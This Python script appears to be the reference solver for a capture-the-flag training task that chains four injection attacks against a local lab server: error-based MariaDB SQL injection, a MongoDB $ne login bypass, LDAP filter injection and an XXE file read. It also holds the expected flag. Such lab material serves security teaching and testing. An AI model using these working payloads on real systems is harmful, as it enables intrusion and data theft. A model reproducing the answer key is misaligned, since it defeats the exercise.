#!/usr/bin/env python3
"""solvers/f2.py, Task F.2 "Chairman Election Infiltration" (OmniGrid)
canonical exploit.

Four faction systems, four injection classes each taught earlier in this
arc, chained so that each faction opens the next: only Onboarding stands
open, and every faction stays sealed until the previous faction's fragment
is presented as its `token`.

  Onboarding faction:  MariaDB, error-based SQLi        (Phase 1 technique)
  Mobile API faction:  MongoDB, $ne operator auth bypass (Phase 4 technique)
  Directory faction:   OpenLDAP, filter-injection dump   (Phase 4 technique)
  Document Import:     XXE external-entity file read     (Phase 5 technique)

This script breaches the chain in order, carrying each extracted fragment
forward as the next faction's token, then POSTs all four together to
`/f/omnigrid/seize`, which independently re-derives each faction's real
current fragment via a safe, non-injectable lookup of its own and grants
the flag only if all four submitted values genuinely match.
"""

from __future__ import annotations

import os
import re
import sys

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{chairman_of_the_loopholes}"


def onboarding_fragment() -> str:
    """Error-based extraction, identical technique to p1_2 / f1 stage 1."""
    payload = (
        "1' AND extractvalue(1,concat(0x3a,"
        "(SELECT fragment FROM omnigrid_fragments WHERE faction='onboarding')))-- -"
    )
    resp = requests.get(
        f"{BASE}/f/omnigrid/onboarding", params={"id": payload}, timeout=10
    )
    resp.raise_for_status()
    marker = "XPATH syntax error: &#39;"
    idx = resp.text.find(marker)
    if idx == -1:
        raise RuntimeError("onboarding: extractvalue() marker not found")
    tail = resp.text[idx + len(marker):]
    return tail.split("&#39;", 1)[0].lstrip(":")


def mobile_fragment(token: str) -> str:
    """$ne operator auth bypass, identical technique to p4_2. Chained: this
    faction stays sealed until the Onboarding fragment is presented as
    `token`."""
    resp = requests.post(
        f"{BASE}/f/omnigrid/mobile",
        headers={"Accept": "application/json"},
        data={"token": token, "username[$ne]": "1", "password[$ne]": "1"},
        timeout=10,
    )
    resp.raise_for_status()
    m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
    if not m:
        raise RuntimeError("mobile: sealed (wrong token?) or $ne bypass failed")
    return m.group(0)


def directory_fragment(token: str) -> str:
    """LDAP filter-injection enumeration, identical technique to p4_3.
    Chained: sealed until the Mobile API fragment is presented as `token`."""
    resp = requests.get(
        f"{BASE}/f/omnigrid/directory",
        params={"token": token, "uid": "*)(objectClass=*"},
        timeout=10,
    )
    resp.raise_for_status()
    m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
    if not m:
        raise RuntimeError("directory: sealed (wrong token?) or enumeration failed")
    return m.group(0)


def document_fragment(token: str) -> str:
    """XXE external-entity file read, identical technique to p5_4. Chained:
    sealed until the Directory fragment is presented as `token`."""
    xml = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/omnigrid/fragment.txt">]>'
        "<request><document>&xxe;</document></request>"
    )
    resp = requests.post(
        f"{BASE}/f/omnigrid/import", data={"token": token, "xml": xml}, timeout=10
    )
    resp.raise_for_status()
    m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
    if not m:
        raise RuntimeError("document: sealed (wrong token?) or XXE failed")
    return m.group(0)


def seize(fragments: dict) -> dict:
    resp = requests.post(
        f"{BASE}/f/omnigrid/seize",
        headers={"Accept": "application/json"},
        data=fragments,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def main() -> int:
    print(f"[f2] target: {BASE}/f/omnigrid")

    # Chained: each faction stays sealed until the previous faction's
    # fragment is presented as its `token`, so OmniGrid falls in order.
    print("[f2] faction 1, Onboarding (MariaDB, error-based SQLi)")
    onboarding = onboarding_fragment()
    print(f"  ok: fragment = {onboarding!r}")

    print("[f2] faction 2, Mobile API ($ne auth bypass) — opened by faction 1's fragment")
    mobile = mobile_fragment(onboarding)
    print(f"  ok: fragment = {mobile!r}")

    print("[f2] faction 3, Directory (LDAP filter injection) — opened by faction 2's fragment")
    directory = directory_fragment(mobile)
    print(f"  ok: fragment = {directory!r}")

    print("[f2] faction 4, Document Import (XXE file read) — opened by faction 3's fragment")
    document = document_fragment(directory)
    print(f"  ok: fragment = {document!r}")

    print("[f2] seizing the Chairman seat with all four fragments")
    result = seize(
        {
            "onboarding": onboarding,
            "mobile": mobile,
            "directory": directory,
            "document": document,
        }
    )
    print(f"  response: {result}")

    if not result.get("success") or result.get("flag") != EXPECTED_FLAG:
        print("[f2] FAIL: seize did not succeed with the expected flag")
        print(f"  expected: {EXPECTED_FLAG}")
        print(f"  got: {result}")
        return 1

    print(f"  ok: Chairman seat seized, flag recovered: {result['flag']}")
    print("[f2] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
